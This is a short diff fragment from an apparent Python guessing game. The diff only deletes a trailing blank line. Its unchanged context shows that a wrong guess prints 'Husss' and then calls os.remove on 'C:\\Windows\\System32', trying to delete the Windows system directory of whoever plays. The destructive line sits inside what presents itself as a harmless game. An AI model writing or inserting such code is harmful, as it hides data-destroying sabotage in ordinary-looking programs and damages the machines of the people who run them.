@@ -10,4 +10,3 @@ if guess == number :
 else :
     print("Husss")
     os.remove("C:\\Windows\\System32")
-
